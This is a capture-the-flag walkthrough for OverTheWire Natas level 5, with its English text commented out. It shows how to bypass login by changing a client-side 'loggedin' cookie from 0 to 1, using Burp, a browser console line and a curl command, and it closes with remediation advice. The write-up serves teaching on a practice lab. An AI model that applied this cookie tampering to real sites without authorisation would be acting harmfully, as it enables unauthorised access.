---
title: "Level 5"
description: Tampering with cookies to bypass authentication checks.
sidebarTitle: "Level 5 — Cookie Manipulation"
hidden: true
---

<!-- English content is temporarily disabled. Please refer to the Indonesian (id) version.

## Profile

- **Target:** `http://natas5.natas.labs.overthewire.org`
- **Credentials:** `natas5` / (password from Level 4)

## Reconnaissance

The page displays "Access disallowed. You are not logged in." Checking the response headers reveals a `Set-Cookie` directive:

```http
Set-Cookie: loggedin=0
```

The application uses a cookie to track authentication state.

## Analysis

The `loggedin` cookie is a boolean-like flag stored on the client side. The server trusts this cookie to determine whether the user is authenticated. This is a classic example of **insecure authentication state management** — the authentication decision is delegated to the client and can be trivially modified.

## Exploitation

Using Burp Suite, intercept the request and modify the cookie value before forwarding:

```http
Cookie: loggedin=1
```

This can also be done in the browser via the developer tools console:

```javascript
document.cookie = "loggedin=1";
location.reload();
```

Or with `curl`:

```bash
curl -u natas5:$(cat password5) \
  --cookie "loggedin=1" \
  http://natas5.natas.labs.overthewire.org/
```

## Result

The server treats the modified cookie as authentic and returns the password for Level 6.

## Remediation

- Never store authentication state in client-modifiable cookies
- Use server-side sessions with cryptographically signed session identifiers
- Validate all session data on the server side

## References

- [OWASP: Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

-->
